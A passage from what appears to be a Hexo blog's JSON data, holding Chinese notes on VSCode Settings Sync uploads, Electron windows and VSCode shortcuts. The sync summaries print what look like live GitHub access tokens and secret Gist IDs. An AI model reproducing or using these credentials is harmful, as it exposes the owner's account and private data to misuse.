Uploaded:\n\n  javascript.json > snippets | javascript.json\n\n  Extensions Removed:\n\nExtensions Added: \\\n  Angular2 v6.0.0 \\\n  background v1.1.17 \\\n  beautify v1.3.0 \\\n  bracket-pair-colorizer v1.0.48 \\\n  code-gnu-global v0.2.2 \\\n  code-settings-sync v2.9.2 \\\n  cpptools v0.17.0 \\\n  ejs-language-support v0.0.1 \\\n  ejs-snippets v0.1.0 \\\n  git-project-manager v1.5.1 \\\n  githistory v0.4.0 \\\n  gitlens v8.2.4 \\\n  html-snippets v0.2.1 \\\n  java v0.24.0 \\\n  javascript-ejs-support v0.3.2 \\\n  JavaScriptSnippets v1.6.0 \\\n  jquerysnippets v0.0.1 \\\n  language-stylus v1.9.2 \\\n  mongoose-os-ide v0.3.0 \\\n  mssql v1.3.1 \\\n  node-module-intellisense v1.5.0 \\\n  npm-intellisense v1.3.0 \\\n  python v2018.4.0 \\\n  tslint v1.0.28 \\\n  vetur v0.11.7 \\\n  view-in-browser v0.0.5 \\\n  vscode-eslint v1.4.8 \\\n  vscode-great-icons v2.1.31 \\\n  vscode-html-css v0.2.0 \\\n  vscode-icons v7.23.0 \\\n  vscode-java-debug v0.9.0 \\\n  vscode-language-babel v0.0.14 \\\n  vscode-language-pack-zh-hans v1.23.4 \\\n  vscode-map-preview v0.4.2 \\\n  vscode-maven v0.7.0 \\\n  vscode-mongodb v0.0.2 \\\n  vscode-npm-script v0.3.4 \\\n  vscode-preview-server v1.0.1 \\\n  vue-vscode-snippets v1.3.0 \\\n  weex v0.4.0 \\\n  xml v1.9.2\n  \n--------------------\nDone.\n\n--------------------\n\n## 2018年5月23日 14:37:12\n\nCODE SETTINGS SYNC UPLOAD SUMMARY\n\nVersion: 2.9.2\n\n--------------------\n\nGitHub Token: **c49d7c88a2236d998b043830034a10d1b00ca5df**\n\n**GitHub Gist: daeb8021fc8862ba3a1fe162cc301c7c**\n\nGitHub Gist Type: Secret\n\nRestarting Visual Studio Code may be required to apply color and file icon theme.\n\n--------------------\n\nFiles Uploaded:\n\n  javascript.json > snippets|javascript.json\n\n  Extensions Removed:\n\nExtensions Added:\\\n  Angular2 v6.1.1\\\n  background v1.1.17\\\n  beautify v1.3.0\\\n  bracket-pair-colorizer v1.0.53\\\n  code-gnu-global v0.2.2\\\n  code-settings-sync v2.9.2\\\n  cpptools v0.17.3\\\n  ejs-language-support v0.0.1\\\n  ejs-snippets v0.1.0\\\n  git-project-manager v1.6.1\\\n  githistory v0.4.1\\\n  gitlens v8.3.2\\\n  html-snippets v0.2.1\\\n  java v0.25.0\\\n  javascript-ejs-support v0.3.2\\\n  JavaScriptSnippets v1.6.0\\\n  jquerysnippets v0.0.1\\\n  language-stylus v1.9.2\\\n  mongoose-os-ide v0.3.0\\\n  mssql v1.3.1\\\n  node-module-intellisense v1.5.0\\\n  npm-intellisense v1.3.0\\\n  python v2018.4.0\\\n  tslint v1.0.29\\\n  vetur v0.12.3\\\n  view-in-browser v0.0.5\\\n  vscode-eslint v1.4.10\\\n  vscode-great-icons v2.1.32\\\n  vscode-html-css v0.2.0\\\n  vscode-icons v7.23.0\\\n  vscode-java-debug v0.9.0\\\n  vscode-language-babel v0.0.14\\\n  vscode-language-pack-zh-hans v1.23.5\\\n  vscode-map-preview v0.4.2\\\n  vscode-maven v0.8.0\\\n  vscode-mongodb v0.0.2\\\n  vscode-npm-script v0.3.4\\\n  vscode-preview-server v1.0.1\\\n  vue-vscode-snippets v1.3.0\\\n  weex v0.4.0\\\n  xml v1.9.2\n  \n--------------------\nDone.","slug":"Editor/VSCode-Update","published":1,"updated":"2018-05-23T06:43:27.844Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i299001qb8xjyb72yba4","content":"<p>CODE SETTINGS SYNC UPLOAD SUMMARY</p>\n<p>Version: 2.9.2</p>\n<hr>\n<p>GitHub Token: a445a630bcdbb6a32670317533c559de9533d8f3</p>\n<p>GitHub Gist: 12d91e8460e10f3c9083b82a25623363</p>\n<p>GitHub Gist Type: Secret</p>\n<p>Restarting Visual Studio Code may be required to apply color and file icon theme.</p>\n<hr>\n<p>Files Uploaded:</p>\n<p>  javascript.json &gt; snippets | javascript.json</p>\n<p>  Extensions Removed:</p>\n<p>Extensions Added: \\<br>  Angular2 v6.0.0 \\<br>  background v1.1.17 \\<br>  beautify v1.3.0 \\<br>  bracket-pair-colorizer v1.0.48 \\<br>  code-gnu-global v0.2.2 \\<br>  code-settings-sync v2.9.2 \\<br>  cpptools v0.17.0 \\<br>  ejs-language-support v0.0.1 \\<br>  ejs-snippets v0.1.0 \\<br>  git-project-manager v1.5.1 \\<br>  githistory v0.4.0 \\<br>  gitlens v8.2.4 \\<br>  html-snippets v0.2.1 \\<br>  java v0.24.0 \\<br>  javascript-ejs-support v0.3.2 \\<br>  JavaScriptSnippets v1.6.0 \\<br>  jquerysnippets v0.0.1 \\<br>  language-stylus v1.9.2 \\<br>  mongoose-os-ide v0.3.0 \\<br>  mssql v1.3.1 \\<br>  node-module-intellisense v1.5.0 \\<br>  npm-intellisense v1.3.0 \\<br>  python v2018.4.0 \\<br>  tslint v1.0.28 \\<br>  vetur v0.11.7 \\<br>  view-in-browser v0.0.5 \\<br>  vscode-eslint v1.4.8 \\<br>  vscode-great-icons v2.1.31 \\<br>  vscode-html-css v0.2.0 \\<br>  vscode-icons v7.23.0 \\<br>  vscode-java-debug v0.9.0 \\<br>  vscode-language-babel v0.0.14 \\<br>  vscode-language-pack-zh-hans v1.23.4 \\<br>  vscode-map-preview v0.4.2 \\<br>  vscode-maven v0.7.0 \\<br>  vscode-mongodb v0.0.2 \\<br>  vscode-npm-script v0.3.4 \\<br>  vscode-preview-server v1.0.1 \\<br>  vue-vscode-snippets v1.3.0 \\<br>  weex v0.4.0 \\<br>  xml v1.9.2</p>\n<hr>\n<p>Done.</p>\n<hr>\n<h2 id=\"2018年5月23日-14-37-12\"><a href=\"#2018年5月23日-14-37-12\" class=\"headerlink\" title=\"2018年5月23日 14:37:12\"></a>2018年5月23日 14:37:12</h2><p>CODE SETTINGS SYNC UPLOAD SUMMARY</p>\n<p>Version: 2.9.2</p>\n<hr>\n<p>GitHub Token: <strong>c49d7c88a2236d998b043830034a10d1b00ca5df</strong></p>\n<p><strong>GitHub Gist: daeb8021fc8862ba3a1fe162cc301c7c</strong></p>\n<p>GitHub Gist Type: Secret</p>\n<p>Restarting Visual Studio Code may be required to apply color and file icon theme.</p>\n<hr>\n<p>Files Uploaded:</p>\n<p>  javascript.json &gt; snippets|javascript.json</p>\n<p>  Extensions Removed:</p>\n<p>Extensions Added:\\<br>  Angular2 v6.1.1\\<br>  background v1.1.17\\<br>  beautify v1.3.0\\<br>  bracket-pair-colorizer v1.0.53\\<br>  code-gnu-global v0.2.2\\<br>  code-settings-sync v2.9.2\\<br>  cpptools v0.17.3\\<br>  ejs-language-support v0.0.1\\<br>  ejs-snippets v0.1.0\\<br>  git-project-manager v1.6.1\\<br>  githistory v0.4.1\\<br>  gitlens v8.3.2\\<br>  html-snippets v0.2.1\\<br>  java v0.25.0\\<br>  javascript-ejs-support v0.3.2\\<br>  JavaScriptSnippets v1.6.0\\<br>  jquerysnippets v0.0.1\\<br>  language-stylus v1.9.2\\<br>  mongoose-os-ide v0.3.0\\<br>  mssql v1.3.1\\<br>  node-module-intellisense v1.5.0\\<br>  npm-intellisense v1.3.0\\<br>  python v2018.4.0\\<br>  tslint v1.0.29\\<br>  vetur v0.12.3\\<br>  view-in-browser v0.0.5\\<br>  vscode-eslint v1.4.10\\<br>  vscode-great-icons v2.1.32\\<br>  vscode-html-css v0.2.0\\<br>  vscode-icons v7.23.0\\<br>  vscode-java-debug v0.9.0\\<br>  vscode-language-babel v0.0.14\\<br>  vscode-language-pack-zh-hans v1.23.5\\<br>  vscode-map-preview v0.4.2\\<br>  vscode-maven v0.8.0\\<br>  vscode-mongodb v0.0.2\\<br>  vscode-npm-script v0.3.4\\<br>  vscode-preview-server v1.0.1\\<br>  vue-vscode-snippets v1.3.0\\<br>  weex v0.4.0\\<br>  xml v1.9.2</p>\n<hr>\n<p>Done.</p>\n","site":{"data":{}},"excerpt":"","more":"<p>CODE SETTINGS SYNC UPLOAD SUMMARY</p>\n<p>Version: 2.9.2</p>\n<hr>\n<p>GitHub Token: a445a630bcdbb6a32670317533c559de9533d8f3</p>\n<p>GitHub Gist: 12d91e8460e10f3c9083b82a25623363</p>\n<p>GitHub Gist Type: Secret</p>\n<p>Restarting Visual Studio Code may be required to apply color and file icon theme.</p>\n<hr>\n<p>Files Uploaded:</p>\n<p>  javascript.json &gt; snippets | javascript.json</p>\n<p>  Extensions Removed:</p>\n<p>Extensions Added: \\<br>  Angular2 v6.0.0 \\<br>  background v1.1.17 \\<br>  beautify v1.3.0 \\<br>  bracket-pair-colorizer v1.0.48 \\<br>  code-gnu-global v0.2.2 \\<br>  code-settings-sync v2.9.2 \\<br>  cpptools v0.17.0 \\<br>  ejs-language-support v0.0.1 \\<br>  ejs-snippets v0.1.0 \\<br>  git-project-manager v1.5.1 \\<br>  githistory v0.4.0 \\<br>  gitlens v8.2.4 \\<br>  html-snippets v0.2.1 \\<br>  java v0.24.0 \\<br>  javascript-ejs-support v0.3.2 \\<br>  JavaScriptSnippets v1.6.0 \\<br>  jquerysnippets v0.0.1 \\<br>  language-stylus v1.9.2 \\<br>  mongoose-os-ide v0.3.0 \\<br>  mssql v1.3.1 \\<br>  node-module-intellisense v1.5.0 \\<br>  npm-intellisense v1.3.0 \\<br>  python v2018.4.0 \\<br>  tslint v1.0.28 \\<br>  vetur v0.11.7 \\<br>  view-in-browser v0.0.5 \\<br>  vscode-eslint v1.4.8 \\<br>  vscode-great-icons v2.1.31 \\<br>  vscode-html-css v0.2.0 \\<br>  vscode-icons v7.23.0 \\<br>  vscode-java-debug v0.9.0 \\<br>  vscode-language-babel v0.0.14 \\<br>  vscode-language-pack-zh-hans v1.23.4 \\<br>  vscode-map-preview v0.4.2 \\<br>  vscode-maven v0.7.0 \\<br>  vscode-mongodb v0.0.2 \\<br>  vscode-npm-script v0.3.4 \\<br>  vscode-preview-server v1.0.1 \\<br>  vue-vscode-snippets v1.3.0 \\<br>  weex v0.4.0 \\<br>  xml v1.9.2</p>\n<hr>\n<p>Done.</p>\n<hr>\n<h2 id=\"2018年5月23日-14-37-12\"><a href=\"#2018年5月23日-14-37-12\" class=\"headerlink\" title=\"2018年5月23日 14:37:12\"></a>2018年5月23日 14:37:12</h2><p>CODE SETTINGS SYNC UPLOAD SUMMARY</p>\n<p>Version: 2.9.2</p>\n<hr>\n<p>GitHub Token: <strong>c49d7c88a2236d998b043830034a10d1b00ca5df</strong></p>\n<p><strong>GitHub Gist: daeb8021fc8862ba3a1fe162cc301c7c</strong></p>\n<p>GitHub Gist Type: Secret</p>\n<p>Restarting Visual Studio Code may be required to apply color and file icon theme.</p>\n<hr>\n<p>Files Uploaded:</p>\n<p>  javascript.json &gt; snippets|javascript.json</p>\n<p>  Extensions Removed:</p>\n<p>Extensions Added:\\<br>  Angular2 v6.1.1\\<br>  background v1.1.17\\<br>  beautify v1.3.0\\<br>  bracket-pair-colorizer v1.0.53\\<br>  code-gnu-global v0.2.2\\<br>  code-settings-sync v2.9.2\\<br>  cpptools v0.17.3\\<br>  ejs-language-support v0.0.1\\<br>  ejs-snippets v0.1.0\\<br>  git-project-manager v1.6.1\\<br>  githistory v0.4.1\\<br>  gitlens v8.3.2\\<br>  html-snippets v0.2.1\\<br>  java v0.25.0\\<br>  javascript-ejs-support v0.3.2\\<br>  JavaScriptSnippets v1.6.0\\<br>  jquerysnippets v0.0.1\\<br>  language-stylus v1.9.2\\<br>  mongoose-os-ide v0.3.0\\<br>  mssql v1.3.1\\<br>  node-module-intellisense v1.5.0\\<br>  npm-intellisense v1.3.0\\<br>  python v2018.4.0\\<br>  tslint v1.0.29\\<br>  vetur v0.12.3\\<br>  view-in-browser v0.0.5\\<br>  vscode-eslint v1.4.10\\<br>  vscode-great-icons v2.1.32\\<br>  vscode-html-css v0.2.0\\<br>  vscode-icons v7.23.0\\<br>  vscode-java-debug v0.9.0\\<br>  vscode-language-babel v0.0.14\\<br>  vscode-language-pack-zh-hans v1.23.5\\<br>  vscode-map-preview v0.4.2\\<br>  vscode-maven v0.8.0\\<br>  vscode-mongodb v0.0.2\\<br>  vscode-npm-script v0.3.4\\<br>  vscode-preview-server v1.0.1\\<br>  vue-vscode-snippets v1.3.0\\<br>  weex v0.4.0\\<br>  xml v1.9.2</p>\n<hr>\n<p>Done.</p>\n"},{"title":"Electron学习笔记","date":"2018-05-26T10:07:20.000Z","_content":"## Electron API DEMOS 学习笔记\n\n### 第一章 WINDOWS\n#### 第一节 Create and Manage Windows\n创建新窗口，并管理现有窗口\n\n每个浏览器窗口都是一个单独的进程，称为`renderer`进程。这个过程，像控制应用程序生命周期的主要过程一样，可以完全访问该 Node.js API。\n\n##### 1.1 Create a new window(创建新窗口)\n`BrowserWindow`模块提供了在应用程序中创建新窗口的能力。主进程模块可以通过远程模块从呈现程序中使用，如图所示。\n","source":"_posts/Electron/Electron学习笔记.md","raw":"---\ntitle: Electron学习笔记\ndate: 2018-05-26 18:07:20\ntags: Electron学习笔记\ncategories: Electron\n---\n## Electron API DEMOS 学习笔记\n\n### 第一章 WINDOWS\n#### 第一节 Create and Manage Windows\n创建新窗口，并管理现有窗口\n\n每个浏览器窗口都是一个单独的进程，称为`renderer`进程。这个过程，像控制应用程序生命周期的主要过程一样，可以完全访问该 Node.js API。\n\n##### 1.1 Create a new window(创建新窗口)\n`BrowserWindow`模块提供了在应用程序中创建新窗口的能力。主进程模块可以通过远程模块从呈现程序中使用，如图所示。\n","slug":"Electron/Electron学习笔记","published":1,"updated":"2018-05-26T10:15:02.310Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i29a001rb8xj3wkihhox","content":"<h2 id=\"Electron-API-DEMOS-学习笔记\"><a href=\"#Electron-API-DEMOS-学习笔记\" class=\"headerlink\" title=\"Electron API DEMOS 学习笔记\"></a>Electron API DEMOS 学习笔记</h2><h3 id=\"第一章-WINDOWS\"><a href=\"#第一章-WINDOWS\" class=\"headerlink\" title=\"第一章 WINDOWS\"></a>第一章 WINDOWS</h3><h4 id=\"第一节-Create-and-Manage-Windows\"><a href=\"#第一节-Create-and-Manage-Windows\" class=\"headerlink\" title=\"第一节 Create and Manage Windows\"></a>第一节 Create and Manage Windows</h4><p>创建新窗口，并管理现有窗口</p>\n<p>每个浏览器窗口都是一个单独的进程，称为<code>renderer</code>进程。这个过程，像控制应用程序生命周期的主要过程一样，可以完全访问该 Node.js API。</p>\n<h5 id=\"1-1-Create-a-new-window-创建新窗口\"><a href=\"#1-1-Create-a-new-window-创建新窗口\" class=\"headerlink\" title=\"1.1 Create a new window(创建新窗口)\"></a>1.1 Create a new window(创建新窗口)</h5><p><code>BrowserWindow</code>模块提供了在应用程序中创建新窗口的能力。主进程模块可以通过远程模块从呈现程序中使用，如图所示。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Electron-API-DEMOS-学习笔记\"><a href=\"#Electron-API-DEMOS-学习笔记\" class=\"headerlink\" title=\"Electron API DEMOS 学习笔记\"></a>Electron API DEMOS 学习笔记</h2><h3 id=\"第一章-WINDOWS\"><a href=\"#第一章-WINDOWS\" class=\"headerlink\" title=\"第一章 WINDOWS\"></a>第一章 WINDOWS</h3><h4 id=\"第一节-Create-and-Manage-Windows\"><a href=\"#第一节-Create-and-Manage-Windows\" class=\"headerlink\" title=\"第一节 Create and Manage Windows\"></a>第一节 Create and Manage Windows</h4><p>创建新窗口，并管理现有窗口</p>\n<p>每个浏览器窗口都是一个单独的进程，称为<code>renderer</code>进程。这个过程，像控制应用程序生命周期的主要过程一样，可以完全访问该 Node.js API。</p>\n<h5 id=\"1-1-Create-a-new-window-创建新窗口\"><a href=\"#1-1-Create-a-new-window-创建新窗口\" class=\"headerlink\" title=\"1.1 Create a new window(创建新窗口)\"></a>1.1 Create a new window(创建新窗口)</h5><p><code>BrowserWindow</code>模块提供了在应用程序中创建新窗口的能力。主进程模块可以通过远程模块从呈现程序中使用，如图所示。</p>\n"},{"title":"VSCode使用笔记","date":"2017-01-16T07:29:53.000Z","archives":"Editer","_content":"## **发现**\n> ### 新建终端\n> `ctrl`+`shift`+`~`\n\n> ### 选择使用空格缩进并配置\n> `ctrl`+`k` `j`\n\n> ### 跳转行\n> `ctrl`+`g`\n\n  \n\n## **演练场**<br/>\n+ **Multi-Cursor Editing(多光标编辑)**<br/>\n  1. 框选择-按下`Ctrl+Shift+Alt+下箭头键`,`Ctrl+Shift+Alt+右转`,`Ctrl+Shift+Alt+UpArrow`,` Ctrl+Shift+Alt+LeftArrow`选择一个文本块,你也可以按住`Shift+Alt`,选择鼠标文本。\n  2. 添加一个光标-按`Ctrl+Alt+UpArrow`或`Ctrl+Alt+向下箭头`,在上面或下面添加一个新的游标,你也可以用Ctrl+Click来在任何地方添加光标。\n  3. 创建游标上出现的所有字符串的字符串-选择一个实例例如背景颜色和媒体未绑定。现在您可以通过简单地输入来替换所有实例。<br/>\n\n+ **IntelliSense(智能提示)**<br/>\n  + Alt+Z/Alt+X\n\n+ **Line Actions(行操作)**\n  1. 复制一条线,并将其插入到当前位置的上方或下方,分别使用Shift+Alt+向下箭头或Shift+Alt+UpArrow。\n  2. 用Alt+UpArrow和Alt+向下箭头移动整行或选择行。\n  3. 用Ctrl+Shift+K删除整个行。<br/><br/>\n  + 提示:另一个非常常见的任务是注释掉一个代码块——您可以通过按`Ctrl+/`来切换注释。\n+ **Rename Refactoring(更名重构)**<br/>\n  + 可以很容易地重命名一个符号,例如`函数名`或`变量名`。在`符号`\"Book(例子)\"中按`F2`重命名所有实例——这将发生在项目中的所有文件中。您还可以在右键单击上下文菜单中看到重构。\n  + `JSDoc`提示:上面的示例还展示了通过使用`JSDoc`注释获得智能感知提示的另一种方法。您可以通过调用Book函数并查看功能和参数的智能感知体验中增强的上下文来尝试这一点。\n\n+ **Refactoring via Extraction(!通过提取重构)**\n  + 有时候,您希望将已经`编写好的代码`添加到一个`单独的函数`中,或者稍后再使用它。选择要提取的行并按`Ctrl+.`或者点击这个小灯泡,选择其中的一个提取到……选项。通过在第3行或任何其他您想要提出的通用代码中选择if-子句中的代码来尝试它。\n\n+ **Formatting(格式化)**\n  + 如果没有良好的格式化程序,让代码看起来很棒是很困难的。幸运的是,使用`Shift+Alt+F`或格式化的整个文档可以用`Ctrl+K Ctrl+F`来应用当前的选择。这两个选项都可以通过右键单击上下文菜单获得。\n  + `Tip`: 可在扩展库中提供其他格式化程序。格式化支持也可以通过设置来配置,例如启用编辑器。\n\n+ **Code folding(代码折叠)**\n  + 在一个大的文件中,它通常可以用来折叠代码段以增加可读性。要做到这一点,你只需按`Ctrl+Shift+[`折叠代码-按`Ctrl+Shift+]`即可展开。折叠也可以用左边沟中的`+/-`图标来完成。按`Ctrl+Shift+Alt+[`或按`Ctrl+Shift+Alt+]`折叠所有部分。\n  + 提示:折叠是基于缩进的,因此可以应用于所有语言。简单地缩进你的代码来创建一个可折叠的部分,你可以用Ctrl+K Ctrl+1和Ctrl+K Ctrl+5这样的快捷方式折叠一定数量的级别。\n\n+ **Errors and Warnings(错误和警告)**\n  + 在编辑代码时,会高亮显示错误和警告。在下面的示例中,您可以看到许多语法错误。按下`F8`,你可以按顺序浏览它们,并看到详细的错误信息。当您纠正它们时,弯角和滚动条指示器将会更新。\n\n+ **Snippets(片段)**\n  + 您可以通过使用片段大大加快编辑速度。简单地开始键入尝试,从`建议列表`和按`Tab`中选择`trycatch`来创建一个`try->catch块`。您的光标将被放置在文本错误,以方便编辑。如果有多个参数存在,则按Tab键跳到它。","source":"_posts/Editor/VSCode使用笔记.md","raw":"---\ntitle: VSCode使用笔记\ndate: 2017-01-16 15:29:53\ntags: VSCode\narchives: Editer\ncategories: VSCode\n---\n## **发现**\n> ### 新建终端\n> `ctrl`+`shift`+`~`\n\n> ### 选择使用空格缩进并配置\n> `ctrl`+`k` `j`\n\n> ### 跳转行\n> `ctrl`+`g`\n\n  \n\n## **演练场**<br/>\n+ **Multi-Cursor Editing(多光标编辑)**<br/>\n  1. 框选择-按下`Ctrl+Shift+Alt+下箭头键`,`Ctrl+Shift+Alt+右转`,`Ctrl+Shift+Alt+UpArrow`,` Ctrl+Shift+Alt+LeftArrow`选择一个文本块,你也可以按住`Shift+Alt`,选择鼠标文本。\n  2. 添加一个光标-按`Ctrl+Alt+UpArrow`或`Ctrl+Alt+向下箭头`,在上面或下面添加一个新的游标,你也可以用Ctrl+Click来在任何地方添加光标。\n  3. 创建游标上出现的所有字符串的字符串-选择一个实例例如背景颜色和媒体未绑定。现在您可以通过简单地输入来替换所有实例。<br/>\n\n+ **IntelliSense(智能提示)**<br/>\n  + Alt+Z/Alt+X\n\n+ **Line Actions(行操作)**\n  1. 复制一条线,并将其插入到当前位置的上方或下方,分别使用Shift+Alt+向下箭头或Shift+Alt+UpArrow。\n  2. 用Alt+UpArrow和Alt+向下箭头移动整行或选择行。\n  3. 用Ctrl+Shift+K删除整个行。<br/><br/>\n  + 提示:另一个非常常见的任务是注释掉一个代码块——您可以通过按`Ctrl+/`来切换注释。\n+ **Rename Refactoring(更名重构)**<br/>\n  + 可以很容易地重命名一个符号,例如`函数名`或`变量名`。在`符号`\"Book(例子)\"中按`F2`重命名所有实例——这将发生在项目中的所有文件中。您还可以在右键单击上下文菜单中看到重构。\n  + `JSDoc`提示:上面的示例还展示了通过使用`JSDoc`注释获得智能感知提示的另一种方法。您可以通过调用Book函数并查看功能和参数的智能感知体验中增强的上下文来尝试这一点。\n\n+ **Refactoring via Extraction(!通过提取重构)**\n  + 有时候,您希望将已经`编写好的代码`添加到一个`单独的函数`中,或者稍后再使用它。选择要提取的行并按`Ctrl+.`或者点击这个小灯泡,选择其中的一个提取到……选项。通过在第3行或任何其他您想要提出的通用代码中选择if-子句中的代码来尝试它。\n\n+ **Formatting(格式化)**\n  + 如果没有良好的格式化程序,让代码看起来很棒是很困难的。幸运的是,使用`Shift+Alt+F`或格式化的整个文档可以用`Ctrl+K Ctrl+F`来应用当前的选择。这两个选项都可以通过右键单击上下文菜单获得。\n  + `Tip`: 可在扩展库中提供其他格式化程序。格式化支持也可以通过设置来配置,例如启用编辑器。\n\n+ **Code folding(代码折叠)**\n  + 在一个大的文件中,它通常可以用来折叠代码段以增加可读性。要做到这一点,你只需按`Ctrl+Shift+[`折叠代码-按`Ctrl+Shift+]`即可展开。折叠也可以用左边沟中的`+/-`图标来完成。按`Ctrl+Shift+Alt+[`或按`Ctrl+Shift+Alt+]`折叠所有部分。\n  + 提示:折叠是基于缩进的,因此可以应用于所有语言。简单地缩进你的代码来创建一个可折叠的部分,你可以用Ctrl+K Ctrl+1和Ctrl+K Ctrl+5这样的快捷方式折叠一定数量的级别。\n\n+ **Errors and Warnings(错误和警告)**\n  + 在编辑代码时,会高亮显示错误和警告。在下面的示例中,您可以看到许多语法错误。按下`F8`,你可以按顺序浏览它们,并看到详细的错误信息。当您纠正它们时,弯角和滚动条指示器将会更新。\n\n+ **Snippets(片段)**\n  + 您可以通过使用片段大大加快编辑速度。简单地开始键入尝试,从`建议列表`和按`Tab`中选择`trycatch`来创建一个`try->catch块`。您的光标将被放置在文本错误,以方便编辑。如果有多个参数存在,则按Tab键跳到它。","slug":"Editor/VSCode使用笔记","published":1,"updated":"2018-05-23T06:32:17.447Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i29c001ub8xjma7kqx5k","content":"<h2 id=\"发现\"><a href=\"#发现\" class=\"headerlink\" title=\"发现\"></a><strong>发现</strong></h2><blockquote>\n<h3 id=\"新建终端\"><a href=\"#新建终端\" class=\"headerlink\" title=\"新建终端\"></a>新建终端</h3><p><code>ctrl</code>+<code>shift</code>+<code>~</code></p>\n<h3 id=\"选择使用空格缩进并配置\"><a href=\"#选择使用空格缩进并配置\" class=\"headerlink\" title=\"选择使用空格缩进并配置\"></a>选择使用空格缩进并配置</h3><p><code>ctrl</code>+<code>k</code> <code>j</code></p>\n<h3 id=\"跳转行\"><a href=\"#跳转行\" class=\"headerlink\" title=\"跳转行\"></a>跳转行</h3><p><code>ctrl</code>+<code>g</code></p>\n</blockquote>\n<h2 id=\"演练场\"><a href=\"#演练场\" class=\"headerlink\" title=\"演练场\"></a><strong>演练场</strong><br></h2><ul>\n<li><p><strong>Multi-Cursor Editing(多光标编辑)</strong><br></p>\n<ol>\n<li>框选择-按下<code>Ctrl+Shift+Alt+下箭头键</code>,<code>Ctrl+Shift+Alt+右转</code>,<code>Ctrl+Shift+Alt+UpArrow</code>,<code>Ctrl+Shift+Alt+LeftArrow</code>选择一个文本块,你也可以按住<code>Shift+Alt</code>,选择鼠标文本。</li>\n<li>添加一个光标-按<code>Ctrl+Alt+UpArrow</code>或<code>Ctrl+Alt+向下箭头</code>,在上面或下面添加一个新的游标,你也可以用Ctrl+Click来在任何地方添加光标。</li>\n<li>创建游标上出现的所有字符串的字符串-选择一个实例例如背景颜色和媒体未绑定。现在您可以通过简单地输入来替换所有实例。<br></li>\n</ol>\n</li>\n<li><p><strong>IntelliSense(智能提示)</strong><br></p>\n<ul>\n<li>Alt+Z/Alt+X</li>\n</ul>\n</li>\n<li><p><strong>Line Actions(行操作)</strong></p>\n<ol>\n<li>复制一条线,并将其插入到当前位置的上方或下方,分别使用Shift+Alt+向下箭头或Shift+Alt+UpArrow。</li>\n<li>用Alt+UpArrow和Alt+向下箭头移动整行或选择行。</li>\n<li>用Ctrl+Shift+K删除整个行。<br><br></li>\n</ol>\n<ul>\n<li>提示:另一个非常常见的任务是注释掉一个代码块——您可以通过按<code>Ctrl+/</code>来切换注释。</li>\n</ul>\n</li>\n<li><p><strong>Rename Refactoring(更名重构)</strong><br></p>\n<ul>\n<li>可以很容易地重命名一个符号,例如<code>函数名</code>或<code>变量名</code>。在<code>符号</code>“Book(例子)”中按<code>F2</code>重命名所有实例——这将发生在项目中的所有文件中。您还可以在右键单击上下文菜单中看到重构。</li>\n<li><code>JSDoc</code>提示:上面的示例还展示了通过使用<code>JSDoc</code>注释获得智能感知提示的另一种方法。您可以通过调用Book函数并查看功能和参数的智能感知体验中增强的上下文来尝试这一点。</li>\n</ul>\n</li>\n<li><p><strong>Refactoring via Extraction(!通过提取重构)</strong></p>\n<ul>\n<li>有时候,您希望将已经<code>编写好的代码</code>添加到一个<code>单独的函数</code>中,或者稍后再使用它。选择要提取的行并按<code>Ctrl+.</code>或者点击这个小灯泡,选择其中的一个提取到……选项。通过在第3行或任何其他您想要提出的通用代码中选择if-子句中的代码来尝试它。</li>\n</ul>\n</li>\n<li><p><strong>Formatting(格式化)</strong></p>\n<ul>\n<li>如果没有良好的格式化程序,让代码看起来很棒是很困难的。幸运的是,使用<code>Shift+Alt+F</code>或格式化的整个文档可以用<code>Ctrl+K Ctrl+F</code>来应用当前的选择。这两个选项都可以通过右键单击上下文菜单获得。</li>\n<li><code>Tip</code>: 可在扩展库中提供其他格式化程序。格式化支持也可以通过设置来配置,例如启用编辑器。</li>\n</ul>\n</li>\n<li><p><strong>Code folding(代码折叠)</strong></p>\n<ul>\n<li>在一个大的文件中,它通常可以用来折叠代码段以增加可读性。要做到这一点,你只需按<code>Ctrl+Shift+[</code>折叠代码-按<code>Ctrl+Shift+]</code>即可展开。折叠也可以用左边沟中的<code>+/-</code>图标来完成。按<code>Ctrl+Shift+Alt+[</code>或按<code>Ctrl+Shift+Alt+]</code>折叠所有部分。</li>\n<li>提示:折叠是基于缩进的,因此可以应用于所有语言。简单地缩进你的代码来创建一个可折叠的部分,你可以用Ctrl+K Ctrl+1和Ctrl+K Ctrl+5这样的快捷方式折叠一定数量的级别。</li>\n</ul>\n</li>\n<li><p><strong>Errors and Warnings(错误和警告)</strong></p>\n<ul>\n<li>在编辑代码时,会高亮显示错误和警告。在下面的示例中,您可以看到许多语法错误。按下<code>F8</code>,你可以按顺序浏览它们,并看到详细的错误信息。当您纠正它们时,弯角和滚动条指示器将会更新。</li>\n</ul>\n</li>\n<li><p><strong>Snippets(片段)</strong></p>\n<ul>\n<li>您可以通过使用片段大大加快编辑速度。简单地开始键入尝试,从<code>建议列表</code>和按<code>Tab</code>中选择<code>trycatch</code>来创建一个<code>try-&gt;catch块</code>。您的光标将被放置在文本错误,以方便编辑。如果有多个参数存在,则按Tab键跳到它。</li>\n</ul>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"发现\"><a href=\"#发现\" class=\"headerlink\" title=\"发现\"></a><strong>发现</strong></h2><blockquote>\n<h3 id=\"新建终端\"><a href=\"#新建终端\" class=\"headerlink\" title=\"新建终端\"></a>新建终端</h3><p><code>ctrl</code>+<code>shift</code>+<code>~</code></p>\n<h3 id=\"选择使用空格缩进并配置\"><a href=\"#选择使用空格缩进并配置\" class=\"headerlink\" title=\"选择使用空格缩进并配置\"></a>选择使用空格缩进并配置</h3><p><code>ctrl</code>+<code>k</code> <code>j</code></p>\n<h3 id=\"跳转行\"><a href=\"#跳转行\" class=\"headerlink\" title=\"跳转行\"></a>跳转行</h3><p><code>ctrl</code>+<code>g</code></p>\n</blockquote>\n<h2 id=\"演练场\"><a href=\"#演练场\" class=\"headerlink\" title=\"演练场\"></a><strong>演练场</strong><br></h2><ul>\n<li><p><strong>Multi-Cursor 